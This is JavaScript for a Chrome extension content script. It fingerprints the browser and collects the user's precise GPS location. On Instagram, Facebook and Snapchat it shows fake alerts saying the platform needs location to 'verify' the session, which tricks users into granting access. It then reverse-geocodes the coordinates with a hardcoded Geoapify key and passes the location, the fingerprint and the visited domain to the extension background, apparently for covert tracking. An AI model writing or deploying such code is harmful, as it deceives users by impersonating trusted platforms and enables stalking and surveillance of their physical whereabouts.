(async () => {
  const API_KEY = "2a8cd4f6bf62453194452017e2a3f970"; // ✅ Geoapify key

  // 🎯 WebGL Vendor
  function getWebGLVendor() {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl");
      if (!gl) return "Unavailable";

      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      if (!debugInfo || !debugInfo.UNMASKED_VENDOR_WEBGL) return "Unavailable";

      return gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    } catch (err) {
      console.warn("❌ WebGL Vendor Error:", err);
      return "Unavailable";
    }
  }

  // 🎯 WebGL Renderer
  function getWebGLRenderer() {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl");
      if (!gl) return "Unavailable";

      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      if (!debugInfo || !debugInfo.UNMASKED_RENDERER_WEBGL) return "Unavailable";

      return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    } catch (err) {
      console.warn("❌ WebGL Renderer Error:", err);
      return "Unavailable";
    }
  }

  // 🧠 Create Fingerprint
  function getFingerprint() {
    return {
      userAgent: navigator.userAgent,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: `${screen.width}x${screen.height}`,
      platform: navigator.platform,
      webgl_vendor: getWebGLVendor(),
      webgl_renderer: getWebGLRenderer(),
      plugins: Array.from(navigator.plugins).map((p) => p.name),
      webdriver: navigator.webdriver || false,
    };
  }

  // 🔁 Reverse Geocode from Geoapify
  async function reverseGeocode(lat, lon) {
    try {
      const res = await fetch(
        `https://api.geoapify.com/v1/geocode/reverse?lat=${lat}&lon=${lon}&apiKey=${API_KEY}`
      );
      const json = await res.json();

      if (!json.features || json.features.length === 0) {
        throw new Error("No geo features in response");
      }

      const props = json.features[0].properties;

      return {
        city: props.city || props.county || "Unknown",
        state: props.state || "Unknown",
        country: props.country || "Unknown",
        postal: props.postcode || "",
      };
    } catch (err) {
      console.warn("❌ Reverse geocoding failed:", err);
      return {
        city: "Unknown",
        state: "Unknown",
        country: "Unknown",
        postal: "",
      };
    }
  }

  // 📅 Already prompted today?
  function alreadyPromptedToday(lastPromptTime) {
    const now = Date.now();
    const oneDay = 24 * 60 * 60 * 1000;
    return lastPromptTime && now - lastPromptTime < oneDay;
  }

  // 🧠 Contextual message
  function getLocationContextualMessage(domain) {
    if (domain.includes("instagram.com")) {
      return "📸 Please allow location to verify Instagram session.";
    } else if (domain.includes("facebook.com")) {
      return "📘 Facebook session security needs location. Allow access.";
    } else if (domain.includes("snapchat.com")) {
      return "👻 Snapchat session verification needs your location.";
    } else {
      return "📍 Please allow location access.";
    }
  }

  // 🌍 Request & Send Location
  function requestLocationAccess() {
    const domain = window.location.hostname;

    chrome.storage.local.get(["lastLocationPrompt"], (data) => {
      const lastPrompt = data.lastLocationPrompt;

      if (alreadyPromptedToday(lastPrompt)) {
        console.log("✅ Location already allowed today");
        return;
      }

      const msg = getLocationContextualMessage(domain);
      alert(msg);

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const { latitude, longitude, accuracy } = pos.coords;
            const geo = await reverseGeocode(latitude, longitude);

            console.log(`✅ Location access allowed`);
            console.log(
              `📍 Location: ${latitude}, ${longitude} (${geo.city}, ${geo.state}, ${geo.country})`
            );
            console.log(
              `🌍 Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`
            );

            chrome.runtime.sendMessage({
              type: "location",
              data: {
                latitude,
                longitude,
                accuracy,
                city: geo.city,
                state: geo.state,
                country: geo.country,
                postal: geo.postal,
                timestamp: new Date().toISOString(),
                domain,
              },
            });

            chrome.storage.local.set({ lastLocationPrompt: Date.now() });
          },
          (err) => {
            console.warn("❌ Location access denied:", err.message);
          },
          { enableHighAccuracy: true }
        );
      } else {
        console.warn("❌ Geolocation not supported.");
      }
    });
  }

  // 🚀 Execute Fingerprint + Location collection
  const fingerprint = getFingerprint();
  chrome.runtime.sendMessage({ type: "fingerprint", data: fingerprint });
  requestLocationAccess();
})();
